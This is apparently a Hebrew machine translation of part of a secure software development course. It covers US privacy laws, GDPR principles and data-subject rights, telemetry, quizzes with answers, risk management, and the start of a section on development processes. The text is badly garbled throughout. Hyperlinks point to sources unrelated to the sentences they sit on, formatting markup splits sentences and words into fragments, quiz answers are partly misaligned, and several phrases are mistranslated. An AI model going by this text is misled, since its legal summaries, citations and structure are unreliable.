1.  **ארצות הברית**בארצות הברית (ארה"ב) אין חוק פרטיות מידע מקיף בכללותו. במקום זאת, לממשל הפדרלי בארה"ב יש מספר חוקים המכסים נסיבות ספציפיות. זה כולל את חוק הזכויות החינוכיות המשפחתיות והפרטיות של 1974 (FERPA) עבור רשומות חינוך תלמידים, חוק הניידות והאחריות של ביטוח בריאות משנת 1996 (HIPAA) עבור נתונים הקשורים לבריאות, חוק הגנת הפרטיות המקוונת של ילדים משנת 1998 (COPPA) עבור נתונים הקשורים לילדים, וחוק עסקאות אשראי הוגנות ומדויקות של 2003 (FACTA) עבור נתונים פיננסיים מסוימים.<br>ה 

2.  **חוק הפרטיות של ארה"ב משנת 1974 (5 U.S.C. 552a)** קובע כיצד סוכנויות פדרליות בארה"ב חייבות לשמור רשומות על אנשים שהם אזרחי ארה"ב וזרים תושבי קבע חוקיים. לדוגמה, הם חייבים:<br>לאסוף רק מידע רלוונטי והכרחי הרלוונטי והנחוץ לביצוע תפקיד סוכנות;

3.  **להסביר בזמן איסוף המידע, מדוע הוא נחוץ וכיצד ייעשה בו שימוש;**לוודא שהרשומות משמשות רק מהסיבות שניתנו, או לבקש את רשותו של האדם כאשר מטרה אחרת לשימוש ברשומות נחשבת נחוצה או רצויה;<br>לספק אמצעי הגנה נאותים כדי להגן על הרשומות מפני גישה וגילוי בלתי מורשים; ו

    אפשר לאנשים לראות את הרשומות שנשמרו בהם וספק להם את ההזדמנות לתקן אי דיוקים ברשומות שלהם.[בחלק ממדינות ארה"ב יש חוקים נוספים. לדוגמה, ](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/)חוק הגנת הפרטיות המקוונת של קליפורניה (OPPA) משנת 2003* דורש מפעילי אתרי אינטרנט מסחריים או שירותים מקוונים *"שאוספת מידע המאפשר זיהוי אישי באמצעות האינטרנט על צרכנים בודדים המתגוררים בקליפורניה המשתמשים או מבקרים \[האתר או השירות שלה] לפרסם באופן בולט את מדיניות הפרטיות שלה..."* ולציית לו. לאחרונה, *חוק פרטיות הצרכן בקליפורניה משנת 2018 (CCPA)

4.  **שנכנס לתוקף בשנת 2020, מעניק לתושבי קליפורניה זכויות נוספות לדעת איזה מידע אישי נאסף על ידי עסקים, ולבטל את הסכמתם למכירת מידע זה.,**אירופה <br>עושה* יש חוק מקיף, וגם אלה מחוץ לאירופה לעתים קרובות חייבים לציית לו. אז בואו נתמקד בזה; הוא חל על מצבים רבים, והבנתו תעזור לך להבין דרישות פרטיות אחרות.*התקנה האירופית הכללית להגנה על נתונים (GDPR)

5.  **התקנה האירופית הכללית להגנה על נתונים (GDPR) מגנה על הנתונים האישיים של נושאים הנמצאים באיחוד האירופי (EU). היא חלה בין אם עיבוד הנתונים מתרחש בתוך האיחוד האירופי ובין אם לאו, והיא חלה בין אם הנבדקים הם אזרחים אירופאים ובין אם לאו. כתוצאה מכך, ה-GDPR חל בנסיבות רבות. **<br>לקרן לינוקס יש סיכום של ה-GDPR

6.  ** שמדגיש נושאים שחשובים למפתחי תוכנה. להלן נצביע על כמה יסודות GDPR מתוך סיכום ה- GDPR של קרן לינוקס.**<br>אבל ראשית: ציות ל-GDPR הוא חשוב. הפרות חמורות עלולות לגרור קנס של עד 20 מיליון אירו, או 4% מההכנסות השנתיות העולמיות של חברה משנת הכספים הקודמת, לפי הסכום מביניהם. 

7.  **גבוה**<br>.

ה-GDPR מגדיר נתונים אישיים (הדורשים הגנה ככאלה) כ 

"כל מידע הנוגע לאדם טבעי מזוהה או הניתן לזיהוי ('נושא הנתונים'); אדם טבעי הניתן לזיהוי הוא אדם שניתן לזהותו, במישרין או בעקיפין, בפרט על ידי התייחסות למזהה כגון שם, מספר זיהוי, נתוני מיקום, מזהה מקוון או לגורם אחד או יותר הספציפיים לזהות הפיזית, הפיזיולוגית, הגנטית, הנפשית, הכלכלית, התרבותית או החברתית של אותו אדם טבעי"*. שים לב שלא רק נתונים מזהים אדם - אלא נתונים המחוברים לנתונים המזהים אדם. לדוגמה, כתובת הדואר של אדם היא נתונים אישיים; פרטים על כישוריו או העדפותיו של אדם הם גם נתונים אישיים אם הם מקושרים, או מסוגלים באופן סביר להיות מקושרים, למידע אחר המזהה את אותו אדם.*במסגרת ה-GDPR חלק מהנתונים האישיים נחשבים לרגישים יותר, ויש הגבלות רבות יותר על איסוף ועיבוד שלהם. אלה כוללים:*מוצא גזעי או אתני*דעות פוליטיות, אמונות דתיות או פילוסופיות, או חברות באיגודים מקצועיים*נתונים גנטיים*נתונים ביומטריים לצורך זיהוי ייחודי של אדם טבעי*נתונים הנוגעים לבריאות*נתונים הנוגעים לחיי המין או לנטייה המינית של אדם טבעי*נתונים אישיים הם *מעובד

 בכל פעם שמתבצעת בו פעולה. זה כולל איסוף, אחסון, הצגה, שידור ומחיקה שלו, בין אם באמצעים אוטומטיים ובין אם לאו. ב- GDPR, "בקר" הוא האדם או הארגון שקובע את מטרת ואמצעי העיבוד. "מעבד" הוא צד שלישי המעבד את הנתונים בשמו של בקר.

ה-GDPR מגדיר שבעה עקרונות עיקריים לעיבוד נתונים אישיים. עקרונות אלה קובעים את המטרות של כל ההוראות הספציפיות של ה-GDPR. הבנתם תורמת רבות לתובנה ראשונית טובה לגבי השאלה אם שימוש מסוים בנתונים אישיים עשוי להיות מקובל. אלה הם:*חוקיות, הגינות ושקיפות*לעבד נתונים אישיים באופן חוקי, הוגן ושקוף לנושא הנתונים.[הגבלת מטרה](https://tools.ietf.org/html/rfc1983)לעבד נתונים אישיים רק בדרכים התואמות את המטרות הלגיטימיות שלשמן הם נאספו.

מזעור נתונים[*הגבל את הנתונים האישיים שאתה אוסף למה שמתאים למטרות אלה.*](https://www.commoncriteriaportal.org/)דיוק*שמור על נתונים אישיים מדויקים ומעודכנים, ונקוט בכל צעד סביר כדי למחוק או לתקן נתונים לא מדויקים.*מגבלת אחסון

**אחסן נתונים אישיים בצורה המאפשרת זיהוי לא יותר מהנדרש למטרות שלשמן הם נאספו.**יושרה וסודיות

#### עבד נתונים אישיים באופן שמבטיח אבטחה מתאימה.

דין וחשבון

בקר של נתונים אישיים אחראי לעקרונות הנ"ל, ולהוכחת עמידתו בהם.

שישה סעיפים ב-GDPR מפרטים זכויות ספציפיות הניתנות לאנשים בנוגע לנתונים האישיים שלהם. זה נותן לתושבי האיחוד האירופי את הזכות ליצור קשר עם בקר נתונים ולבקש ממנו לנקוט בפעולות מסוימות (

בקשות GDPR

). מכיוון שלתושבי האיחוד האירופי יש זכויות אלה, יש לתכנן מערכות תוכנה ותהליכים ארגוניים כדי לאפשר זכויות אלה. סוגי הבקשות המתוארים ב- GDPR כוללים את הדברים הבאים:

זכות גישה

 (סעיף 15)

### נושאי הנתונים יכולים לשאול אם הנתונים האישיים שלהם מעובדים. אם כן, הם יכולים לקבל "גישה" לנתונים (למשל, עותק או צילום מסך שלהם) ומידע בנוגע לעיבוד.

הזכות לתיקון

####  (סעיף 16)

נושאי הנתונים יכולים לעדכן ולתקן נתונים לא מדויקים.[הזכות למחיקה](https://iapp.org/about/what-is-privacy/) (א.ק.א "הזכות להישכח") (סעיף 17)*בנסיבות מסוימות, נושאי הנתונים יכולים למחוק את הנתונים האישיים שלהם.*הזכות להגבלת העיבוד* (סעיף 18)*בנסיבות מסוימות, נושאי הנתונים יכולים להגביל את עיבוד הנתונים האישיים שלהם. עדיין ניתן לאחסן אותו, אלא אם כן הוגשה גם בקשה ל"זכות למחיקה".*הזכות לניידות נתונים*

 (סעיף 20)

#### בנסיבות מסוימות, נושאי הנתונים יכולים לייצא את הנתונים האישיים שלהם (לדוגמה, מסופקים לנושא הנתונים או לצד שלישי בפורמט מובנה, נפוץ וקריא במכונה).

הזכות להתנגד[* (סעיף 21)*](https://www.ted.com/talks/glenn_greenwald_why_privacy_matters)בנסיבות מסוימות, במיוחד למטרות שיווק ישיר ויצירת פרופילים, נושאי נתונים יכולים להתנגד לעיבוד הנתונים האישיים שלהם.

*   כדי לעבד נתונים אישיים, עליהם להיות חוקיים, כלומר עליהם ליפול לפחות לאחת מכמה קטגוריות, כולל בין היתר את הקטגוריות הבאות:*ציות לחוק*. ניתן לעבד נתונים אישיים אם הדבר נחוץ לצורך עמידה בחובה חוקית.*ביצוע חוזה עם נושא הנתונים*

*   . ניתן לעבד נתונים אישיים אם יש צורך לבצע חוזה עם אותו נושא נתונים. 

*   *שים לב שסביר להניח שזה לא חל על חוזה עם מישהו אחר מלבד נושא הנתונים, כגון המעסיק שלהם.*

*   *אינטרסים עסקיים לגיטימיים*

*   *. ניתן לעבד נתונים אישיים אם הדבר עולה בקנה אחד עם "אינטרסים לגיטימיים", אלא אם כן האינטרסים של הנבדק גוברים עליהם. זה יכול להיות מושג מעורפל יותר.*

*   *הסכמה*

*   *. ניתן לעבד נתונים אישיים אם נושא הנתונים נותן את הסכמתו.*

### שים לב שניתן לעבד נתונים אישיים אם נושא הנתונים נותן את הסכמתו. עם זאת, כדי שההסכמה תהיה תקפה במסגרת ה-GDPR:

#### זה חייב להיות 

"ספציפי"

 ו *"הודיע"* (לדוגמה, הוא צריך לכלול תיאור ספציפי של הנתונים הנאספים, וכיצד ייעשה בהם שימוש);

זה דורש 

#### "העדפה מתקנת ברורה"

 על ידי נושא הנתונים (למשל, דרישה מהמשתתף לסמן תיבת סימון, ולא לבדוק אותה מראש); ו

[הוא חייב להיות ניתן לביטול באופן חופשי (לדוגמה, הנבדק חייב להיות מסוגל לבטל את הסכמתו בכל עת).](https://www.ohchr.org/en/professionalinterest/pages/ccpr.aspx)גם אם תינתן הסכמה, ייתכן שתרצה למצוא גם בסיס חוקי אחר לעיבוד הנתונים, במיוחד אם ברצונך לשמור אותם. על פי ה-GDPR, בדרך כלל נאסר עליך לשמור נתונים אישיים ללא בסיס חוקי.*במסגרת ה-GDPR, *

פרופיל

####  הוא כל צורה של עיבוד אוטומטי הכוללת שימוש בנתונים אישיים כדי להעריך היבטים של אותו אדם. יצירת פרופיל תדרוש בדרך כלל קבלת הסכמה מפורשת מהאדם, כלומר גם שהאדם יוכל לבטל הסכמה זו בכל עת. לכן, פעילויות יצירת פרופילים ידרשו בדרך כלל מידה רבה יותר של סקירה והגנות עבור הנתונים האישיים הרלוונטיים.

הנה כמה משאבים לקבלת מידע נוסף על GDPR:

ה [האתר הרשמי של האיחוד האירופי עבור טקסט GDPR](https://www.govinfo.gov/content/pkg/USCODE-2018-title5/pdf/USCODE-2018-title5-partI-chap5-subchapII-sec552a.pdf)"המדריך לתקנה הכללית להגנה על נתונים (GDPR)"

*   "פתרונות לשימוש אחראי בבלוקצ'יין בהקשר של נתונים אישיים"

*   "אבטחת נתונים אישיים"

*   קרן לינוקס, 

*   "סיכום מושגי GDPR עבור פרויקטים של תוכנה חופשית וקוד פתוח"

*   חוק הגנת הפרטיות המקוונת של קליפורניה, פרק 22. דרישות פרטיות באינטרנט \[22575-22579]

טלמטריה[תוכנה כוללת לעתים פונקציונליות לאיסוף נתוני מדידת שימוש, כלומר, נתונים על אופן השימוש או הביצועים של התוכנה. נתוני טלמטריה נאספים לעתים קרובות באמצעות מנגנון "טלפון הביתה" המובנה בתוכנה עצמה, שבו התוכנה שולחת נתונים אלה למקום אחר.](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC\&sectionNum=22575)נתוני טלמטריה כרוכים במיוחד בבעיות פרטיות וסודיות. למשתמשי קצה מוצגת בדרך כלל אפשרות להצטרף לשיתוף נתונים סטטיסטיים עם מפתחי התוכנה, אך ייתכן שהסכם זה אינו מספיק. באופן אידיאלי, יש לתת למשתמשי הקצה מודעות מלאה לאילו נתונים עשויים להישלח לאילו גורמים (כולל הספק) כאשר הם משתמשים בתוכנה, וליכולת לשלוט בהעברת נתונים זו.*קרן לינוקס *"מדיניות איסוף ושימוש בנתוני מדידת שימוש"[ מציג דיון קצר בכמה מהנושאים שיש לקחת בחשבון לפני יישום איסוף נתוני טלמטריה, כמו גם דיון בגישת הקרן לניהול השימוש בטלמטריה על ידי קהילות פרויקט הקוד הפתוח שלה. זה עשוי להיות שימושי עבורך בהקשרים אחרים.](https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?division=3.\&part=4.\&lawCode=CIV\&title=1.81.5)חידון 1.3: דרישות פרטיות

\>>איזו מההצהרות הבאות הקשורות לפרטיות נכונה?|| בדוק את כל האפשרויות שלהלן שהן נכונות, ואל תבדוק אותן אחרת. <<*\[!] אין חוקי פרטיות בארצות הברית. {{ נבחר: לא. בארצות הברית אין *מקיף

####  חוק פרטיות המידע בכללותו. במקום זאת, לממשל הפדרלי בארה"ב יש מספר חוקים המכסים נסיבות ספציפיות שונות. יש גם כמה חוקי מדינה. }}

\[ ] ה-GDPR אינו רלוונטי כל עוד אתה מעבד נתונים אישיים מחוץ לאירופה. {{ נבחר: לא. תקנת GDPR חלה על אלה המעבדים נתונים אישיים של אלה המתגוררים באירופה, בין אם הם מעובדים באירופה ובין אם לאו. אי ציות ל- GDPR עשוי להיות ניתן לאכיפה או לא, בהתאם למגוון גורמים, אך במקרים רבים הוא רלוונטי מאוד. }}[\[x\] במסגרת ה-GDPR, נתונים אישיים מסוימים נחשבים לרגישים יותר, ויש הגבלות רבות יותר על איסוף ועיבוד שלהם. זה כולל דעות פוליטיות, אמונות דתיות או פילוסופיות, חברות באיגודים מקצועיים, נתונים גנטיים ונתונים הנוגעים לבריאות.](https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr\_052418.pdf)\[ ] על פי ה-GDPR, ברגע שניתנה הסכמה לא ניתן לבטל אותה. {{ נבחר: לא, ה-GDPR דורש שמשתמשים יוכלו לבטל את הסכמתם. אם אין סיבה משפטית אחרת שניתן לשמור ולעבד את הנתונים, יש למחוק את הנתונים. }}

\[ ] במסגרת ה-GDPR, תיבת הסימון "אני מסכים" מסומנת מראש מספיקה כדי לקבל הסכמה. {{ נבחר: לא, הסכמה דורשת "העדפה מתקנת ברורה". תיבות מסומנות מראש אינן נחשבות. }}*\[x] במסגרת ה-GDPR, נושאי נתונים יכולים, בנסיבות מסוימות, לדרוש שהנתונים האישיים שלהם יימחקו.*איך נגיע לשם?

ניהול סיכונים*הסיכונים הם *בעיות פוטנציאליות

. המפתח לפיתוח תוכנה מאובטחת כראוי הוא לנהל את הסיכונים של פיתוח תוכנה לא מאובטחת, 

*   לפני

*    הם הופכים לבעיות.

*   הצורך בניהול סיכונים

*   כל החיים כרוכים בסיכון. זה לא מציאותי לצפות שלא יהיו סיכונים בחיים. בפרט, ישנם סיכונים לכל מי שמשתמש בתוכנה שאתה מפתח מכיוון שהיא עלולה להיות בעלת פגיעויות. כאשר אתה מפתח תוכנה, סביר להניח שתעשה טעויות, וחלק מהטעויות הללו עלולות להוביל בסופו של דבר לפגיעויות אבטחה. מישהו עשוי אפילו לנסות להכניס בכוונה פגיעויות או קוד זדוני לתוכנה שלך, או לתוכנה שאתה תלוי בה, במהלך הפיתוח שלה. אפילו טכניקות חזקות מאוד להתמודדות עם פגיעויות חייבות להתבסס על הנחות או יכולות רק לחסל 

*   כמה

*    סיכונים הקשורים לאבטחה, ולכן שוב, זה לא מציאותי לצפות שלא יהיו סיכונים.

אבל כשאתה מפתח תוכנה, עליך לנקוט צעדים סבירים כדי *לנהל* סיכונים כך שהסיכונים כל כך נמוכים (הן למפתחים והן למשתמשים שלה) שהם מקובלים. בספרו, 

"הכישלון של ניהול סיכונים: למה זה שבור ואיך לתקן את זה"

1.  ** (2009), דאגלס האברד מגדיר ניהול סיכונים כ **<br>"זיהוי, הערכה ותעדוף של סיכונים... ואחריו יישום מתואם וחסכוני של משאבים כדי למזער, לפקח ולשלוט בהסתברות או בהשפעה של אירועים מצערים"

2.  **.**<br>אחד הסיכונים בעת פיתוח ופריסה של תוכנה הוא שהתוקפים ינצלו את נקודות התורפה שלה ויגרמו נזק לאחרים. לא ניתן למנוע מהתוקפים לנסות לתקוף את המערכת. למעשה:

3.  **🚩 אם אנשים מתחילים להשתמש בתוכנה שאתה מפתח, **<br>מצפה

4.  ** שיריבים אינטליגנטיים ינסו לתקוף אותו.**<br>אמנם לא ניתן למנוע מתוקפים לתקוף תוכנה, אך באפשרותך להקשות על התקפה להצליח, או להפחית את ההשפעה אם התקפה מצליחה. באפשרותך לעשות זאת על-ידי נקיטת צעדים לאורך פיתוח התוכנה ופריסתה כדי להפחית את הסיכונים לרמה נמוכה באופן מקובל. אם התוכנה שלך נמצאת בשימוש נרחב או תלויה במשימות חיוניות, חשוב במיוחד שתעבוד כדי לנהל סיכונים אלה למשתמשים שלך.

5.  **לעשות **<br>לא

6.  ** חכו לחשוב על סיכונים עד שהם יקרו. אז הם כבר לא סיכונים - הם כן **<br>בעיות

7.  **. קל וזול יותר לטפל בסיכונים **<br>לפני

 הם הופכים לבעיות! הרבה יותר קל לתכנן את התוכנה כדי למזער סיכונים מאשר לשנות את התוכנה מאוחר יותר. זה גם טוב יותר עבור המשתמש, המוניטין המקצועי שלך, המוניטין של התוכנה והמוניטין של כל ארגון קשור.*תהליך ניהול סיכונים*פרויקטים קטנים עם השפעות נמוכות יחסית יכולים לבצע ניהול סיכונים באופן לא רשמי. פרויקטים גדולים עם השפעות גדולות צריכים להיות קפדניים יותר. ללא קשר, ניתן לחלק את ניהול הסיכונים לפעילויות הבאות (על פי משרד ההגנה האמריקאי 

*   **מדריך לניהול סיכונים, סוגיות והזדמנויות עבור תוכניות רכש ביטחוניות**, 2017):<br>תכנון סיכונים

*   **. קבע את תהליך ניהול הסיכונים של הפרוייקט.**זיהוי סיכונים<br>. זהה מה 

*   **אולי** להשתבש. טריק טוב הוא לחפש פרויקטים דומים - אילו סיכונים ובעיות היו להם? מומלץ לרשום רשימה זו כדי שניתן יהיה לשתף אותה. לענייננו, אנו מודאגים מסיכונים הקשורים לאבטחה.<br>ניתוח סיכונים

*   **. קבע את שתי התכונות העיקריות של סיכון: **הסבירות<br> של האירוע הלא רצוי ושל 

*   **חומרת** של השלכותיה. סיכון הופך לחשוב יותר ויותר אם הסבירות ו/או החומרה שלו גדלות.<br>טיפול בסיכונים

*   **. קבע מה תעשה לגבי הסיכון. עומדות בפניך מספר אפשרויות עבור כל סיכון:**קבלה (וניטור)<br>הסיכון מתקבל, אך מנוטר ומועבר לבעלי העניין שלו (כולל המשתמשים בו).: זה סביר אם הסבירות או החומרה נמוכות.

הימנעות

*   **. הסיכון מתבטל על ידי ביצוע שינוי כלשהו. כלומר, אתה הופך את הסבירות שלו לאפס או את חומרתו ללא רלוונטית. זה נהדר כאשר אתה יכול לעשות את זה. לדוגמה, ייתכן שתבחר **לא

*   ** אסוף נתונים מסוימים (אז לא תוכל לאבד את סודיותם מאוחר יותר), או שתוכל לבחור שפת תכנות שבה סוגים מסוימים של פגיעויות אינם יכולים להתרחש (ביטול הסיכונים מסוגים אלה של פגיעויות).**העברה*. הסיכון מועבר למישהו אחר (למשל, רכישת ביטוח, או שינוי המערכת כך שלרכיב אחר יהיה את הסיכון הזה והמפתחים שלו יקבלו אותו). לדוגמה, במקום לקחת על עצמך את הסיכונים של זיהוי ואימות שגויים (I\&A), סמוך על מערכת קיימת כלשהי שתעשה I\&A.*

*   **לשלוט**. להפחית באופן פעיל את הסיכון לרמה מקובלת. מכיוון שחשיבותו של סיכון תלויה בסבירות ובחומרתו, משמעות הדבר היא שינוי דברים כדי להפוך את הסבירות ו/או החומרה לנמוכה (או לפחות נמוכה יותר). עבור סיכונים הקשורים לאבטחה, לעתים קרובות זה מה שעליך לעשות. אין דרך אחת לעשות זאת, אז במקום זאת אתה צריך להפחית באופן רציף את הסבירות והחומרה באמצעות פיתוח תוכנה ופריסה עד הסיכונים מקובלים. לדוגמה, אתה עשוי:

*   **ודא שכל המפתחים יודעים על סוגים מסוימים של טעויות נפוצות שמובילות לסוג מסוים של פגיעות (כדי שיוכלו להימנע מהן),**השתמש בגישות (כגון עיצוב מאובטח, שפות תכנות ספציפיות וממשקי API) שנועדו להקטין את הסבירות לפגיעויות אלה,

השתמש בכלים ובביקורות כדי לזהות טעויות (כולל פגיעויות), וכן

*   להקשיח את המערכת. הקשחת מערכת פירושה שינוי מערכת כך שפגמים נוטים פחות להפוך לפגיעויות אבטחה. נדון בהקשחה בהמשך הקורס.*ניטור סיכונים*. קבע כיצד הסיכונים השתנו עם הזמן. לאורך זמן, אתה צריך "לשרוף" את הסיכונים שלך - כלומר, הצעדים שאתה נוקט צריך להיות צמצום מתמיד של סבירות הסיכון או חומרתו לרמות מקובלות.*ניהול סיכונים הוא *לא

*    מסובך. זה בעצם השכל הישר. אבל כאשר אתה עובד על פתרון הבעיות הנוכחיות קל לשכוח סיכונים, שהם רק *פוטנציאלי* בעיות. קצת מחשבה 

*   קדימה

 של זמן יכול לחסל בעיות פוטנציאליות לפני שהם הופכים לבעיות אמיתיות.

זיהוי סיכונים*שימו לב שהצעד הראשון (מעבר לתכנון) הוא זיהוי סיכונים. אבל איך מזהים את הסיכונים של פגיעויות אבטחה? ברור שאנשים רבים עושים זאת *לא

 שים לב לסיכוני פגיעויות אבטחה.

*   לברוס שנייר יש את הסיפור הנפלא הזה ([הלך הרוח של האבטחה](http://data.europa.eu/eli/reg/2016/679/oj)

*   [*, 2008):*](https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/)

*   [*"דוד מילטון תעשיות מוכר חוות נמלים לילדים מאז 1956. לפני כמה שנים, אני זוכר שפתחתי אחד עם חבר. לא היו נמלים ממשיות כלולות בקופסה. במקום זאת, היה כרטיס שמילאת עם הכתובת שלך, והחברה הייתה שולחת לך כמה נמלים. חברתי הביעה פליאה על כך שאתה יכול לקבל נמלים שנשלחו אליך בדואר. \[ברוס שנייר\] השיב: 'מה שבאמת מעניין הוא שהאנשים האלה ישלחו צינור של נמלים חיות לכל מי שתגיד להם'... אבטחה דורשת חשיבה מסוימת. מומחי אבטחה - לפחות הטובים שבהם - רואים את העולם אחרת. הם לא יכולים להיכנס לחנות בלי לשים לב איך הם עשויים לקנות. הם לא יכולים להשתמש במחשב מבלי לתהות על פגיעויות האבטחה. הם לא יכולים להצביע בלי לנסות להבין איך להצביע פעמיים".*](https://www.cnil.fr/sites/default/files/atoms/files/blockchain_en.pdf)

*   [*האם ניתן ללמד את הלך הרוח הזה? הניסיון שלנו הוא שזה יכול להיות, לפחות בחלקו. רשימות פעולות לביצוע, הדרכה וטיפים עוזרים להזכיר לאנשים לחפש דברים מסוימים, במיוחד כשהם בנויים מחוויות עבר רלוונטיות. טכניקה נוספת שעוזרת היא עבודה לפיתוח חשיבה מעט פרנואידית. לא רמה קלינית של פרנויה, אלא דאגה מתמדת ברמה נמוכה שיש סיכונים רבים ושיש אנשים שבאמת יוצאים להשיג אותך. זכור כי משתמשים מסוימים יבקשו בכוונה לגרום למצבים נדירים, לא סבירים או בלתי צפויים, בתקווה שהתקפות כאלה יעניקו להם הרשאות לא מוצדקות. כתוצאה מכך, בעת כתיבת תוכניות מאובטחות, פרנויה היא סגולה. דיבור על סיכונים עם אחרים, סקירת תוכניות עם אחרים וחיפוש מתמיד אחר סיכונים יכולים כולם לסייע בזיהוי סיכונים כך שניתן יהיה לטפל בהם *](https://www.cnil.fr/sites/default/files/atoms/files/cnil_guide_securite_personnelle_gb_web.pdf)

*   לפני[* הם הופכים לבעיות.*](https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr\_052418.pdf)

*   [אבטחה היא תהליך, לא מוצר](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC\&sectionNum=22575)

#### במאמרו, 

תהליך האבטחה

 (2000), ברוס שנייר הסביר באופן מפורסם כי

"אבטחה היא תהליך ולא מוצר... אין דבר כזה אבטחה מושלמת. באופן מעניין, זו לא בהכרח בעיה. ... האבטחה לא חייבת להיות מושלמת, אבל הסיכונים צריכים להיות ניתנים לניהול...".[*העולם משתנה. אופן השימוש בתוכנה שלך משתנה. נקודות תורפה חדשות מתגלות. הפלטפורמה והספריות של התוכנה משתנות. חוקים, מדיניות החברה ויעדים משתנים. תוכנה שהייתה מאובטחת לפני שנה או חמש שנים עשויה שלא להיות מספקת כיום.*](https://www.linuxfoundation.org/telemetry-data-policy/)מכיוון שביטחון הוא תהליך, הוא לא רק "אש ושכח". אתה צריך כל הזמן לשקול אבטחה.

#### רשימות פעולות לביצוע אינן אבטחה

אל תשווה בין רשימות, הנחיות ועצות לביצוע לבין אבטחה. לעתים קרובות הם 

שימושי*מכיוון שהם יכולים לעזור לך לזהות סיכונים ודרכים סבירות לטפל בהם., רשימות פעולות לביצוע טובות, הנחיות וטיפים יכולים לחסוך לך הרבה זמן וצרות, והם גם עזרים נהדרים לעזור לאחרים להעריך את האבטחה של תוכנות מסוימות. טובים בנויים על ניסיון של אחרים, ואתה תהיה טיפשי להתעלם מהחוויה הזו.*אבל הם רק עזרים למטרה האמיתית; הם לא המטרה עצמה. אתה יכול לעקוב אחר רשימות פעולות לביצוע, הנחיות וטיפים, ויש לך תוכנה לא מאובטחת להחריד. ניתן גם 

להתעלם

 חלקם לא הולמים ויש להם תוכנה מאובטחת מאוד. בקיצור:

אין תחליף לחשיבה.

קורס זה ייתן לך מספר טיפים שיעזרו לך להפחית סיכונים, תוך התמקדות בשיעורים שמפתחים קודמים למדו. אבל הם רק טיפים; הם בסך הכל 

סיוע

##  לפיתוח תוכנה מאובטחת. כאשר אתה מפתח תוכנה, חשוב ללא הרף על הדרכים שבהן תוקף עשוי לנסות לנצל את המערכת שלך. צפה מראש את הבעיות הפוטנציאליות - כל עוד הן עדיין סיכונים - וצמצם אותן.

### חידון 1.4: ניהול סיכונים

\>>מטרת פיתוח תוכנה מאובטחת היא לחסל את כל סיכוני האבטחה האפשריים. אמת או שקר? <<*( ) נכון*(x) לא נכון*\[הסבר]*זה לא נכון. זה יהיה נהדר אם נוכל לחסל את כל הסיכונים, אבל זה לא סביר. במקום זאת, המטרה שלנו היא להפחית את ההסתברות והחומרה של כל הסיכונים, כולל פגיעויות אבטחה, לרמות מקובלות.

#### \[הסבר]

תהליכי פיתוח / הגנה ברוחב*אין מנגנון קסם אחד לייצור תוכנה מאובטחת. במקום זאת, עליך לשקול באופן רציף אבטחה לאורך כל פיתוח התוכנה והפריסה. התחשבות באבטחה בכל עת, דרך כל תהליכי הפיתוח והפריסה, נקראת לעתים "הגנה ברוחב". אז בואו נדבר על התהליכים המשמשים לפיתוח תוכנה ופריסה.*תהליכי פיתוח תוכנה ופריסה אישיים

בכל פעם שאתה מפתח תוכנה יש תהליכים מסוימים שכל המפתחים צריכים לעשות. אלה כוללים:*לקבוע *דרישות[* (מה התוכנה חייבת לעשות). מטעמי אבטחה, ודא שאתה יודע אילו דרישות אבטחה הוא צריך לספק. לדוגמה, האם יש נתונים שהוא צריך לשמור בסודיות?*](https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536)לקבוע *תכנון אדריכלי* (כיצד לחלק את הבעיה לרכיבים אינטראקציה כדי לפתור אותה). בהמשך קורס זה נדון בעקרונות שונים של עיצוב מאובטח שיעזרו לך לתכנן מערכת קלה יותר לאבטחה.

בחירת רכיבים הניתנים לשימוש חוזר

** (החליטו באילו חבילות/ספריות לשימוש חוזר תשתמשו). עליך להעריך את הרכיבים שבהם תשתמש, מכיוון שכל אחת מהפגיעויות שלהם עלולה להפוך לפגיעויות של התוכנה שאתה מפתח. רכיבים אלה שנעשה בהם שימוש חוזר מגיעים ממקום כלשהו, ותלויים באופן טרנזיטיבי ברכיבים אחרים. הסט של כל התלות הזו, כולל מאיפה הם באים ואיך הם מגיעים אליך בסופו של דבר, הוא שלך *שרשרת אספקה*.**

כלי

 זה (לכתוב את הקוד). רוב פגיעויות האבטחה שנעשו במהלך היישום הן סוגים נפוצים ספציפיים; ברגע שאתה יודע מה הם, אתה יכול להימנע מהם.*לאמת* זה (לכתוב / ליישם בדיקות ולהשתמש אנלייזרים כדי לקבל ביטחון שהוא עושה את מה שהוא אמור). עליך לבדוק כדי לוודא שהמערכת שלך מאובטחת, ולהשתמש בכלים שיעזרו לך למצוא פגיעויות לפני שהתוקפים ימצאו אותן.*לפרוס* הוא. עליך לעזור להבטיח שמשתמשים יוכלו לקבל את הגירסה הנכונה, שהיא מאובטחת כברירת מחדל ושהם יוכלו להפעיל אותה בקלות בצורה מאובטחת.*שימוש בתהליכים אלה יחד*כמובן, אתה צריך להשתמש בתהליכים אלה יחד.

#### טעות נפוצה היא לנסות לבצע את תהליכי פיתוח התוכנה האלה ברצף קפדני (להבין את כל הדרישות, ואז לעבוד את העיצוב כולו, ולאחר מכן ליישם את המערכת כולה, ולאחר מכן לאמת את זה). הניסיון ליצור תוכנה ברצף קפדני זה נקרא 

מפל[* מודל. מודל מפל המים מתחנן מכיוון שעושים את התהליכים האלה ברצף קפדני *](http://acqnotes.com/wp-content/uploads/2017/07/DoD-Risk-Issue-and-Opportunity-Management-Guide-Jan-2017.pdf)מופיע

1.  ** קפדני והגיוני בהתחלה. בשנת 1970, וינסטון ו. רויס הסביר במאמרו **ניהול פיתוח מערכות גדולות: מושגים וטכניקות

